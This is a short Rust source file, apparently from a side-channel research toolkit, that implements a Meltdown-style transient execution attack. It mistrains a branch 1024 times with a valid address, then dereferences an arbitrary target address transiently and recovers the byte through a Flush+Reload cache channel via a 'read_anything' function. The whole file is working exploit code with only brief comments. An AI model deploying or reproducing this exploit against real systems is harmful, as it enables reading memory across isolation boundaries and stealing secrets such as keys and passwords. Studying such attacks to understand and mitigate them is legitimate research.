use crate::fr::FlushReload;

const MISTRAIN_REPEATS: usize = 1024;

pub trait Meltdown {
    fn read_anything(&self, addr: *const u8) -> Option<u8>;
}

pub struct MeltdownUS {
    channel: FlushReload,
    buffer: Vec<u8>, // Length >0 is required
}

impl Meltdown for MeltdownUS {
    fn read_anything(&self, addr: *const u8) -> Option<u8> {
        // mistrain the if-clause with a valid address. so that the exception is suppressed
        for _ in 0..MISTRAIN_REPEATS {
            self.leak_if_flag(self.buffer.as_ptr(), true);
        }

        // The leakage is executed transiently so that the exception is suppressed.
        self.leak_if_flag(addr, false);
        self.channel.get()
    }
}

impl MeltdownUS {
    pub fn new() -> MeltdownUS {
        let channel = FlushReload::new();
        let buffer = vec![0u8; 256];
        MeltdownUS { channel, buffer }
    }

    fn leak_if_flag(&self, addr: *const u8, flag: bool) {
        if flag {
            let secret = unsafe { *addr };
            self.channel.leak(secret);
        }
    }
}
